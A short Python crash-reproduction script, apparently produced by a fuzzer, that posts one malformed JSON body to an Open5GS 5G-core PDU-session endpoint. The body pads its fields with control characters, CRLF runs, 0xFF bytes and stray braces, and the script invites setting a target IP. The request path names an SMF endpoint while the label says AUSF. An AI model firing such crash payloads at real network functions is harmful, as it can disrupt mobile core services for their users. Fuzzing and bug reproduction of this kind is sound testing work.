#!/usr/bin/env python3
# Crash reproduction for open5gs-ausf (info)
# Detected: Sat May  9 06:14:13 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'POST'
path = '/nsmf-pdusession/v1/pdu-sessions/1/modify'
body = b'{"supi": "imsi-901700000000001\\u0001\\u0001\\u0001\\u0001\\u0001\\u0001\\u0001\\u0001\\u0001\\u0001", "dnn": "internet\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n", "sNssai": {"sst": 1, "sd": "010203"}, "pduSessionId": 1, "pduSessionType": "IPV4\\u00ff\\u00ff\\u00ff\\u00ff\\u00ff\\u00ff\\u00ff\\u00ff\\u00ff\\u00ff", "sscMode": "SSC_MODE_1}}}}}}}}}}}}}}}}}}}}"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
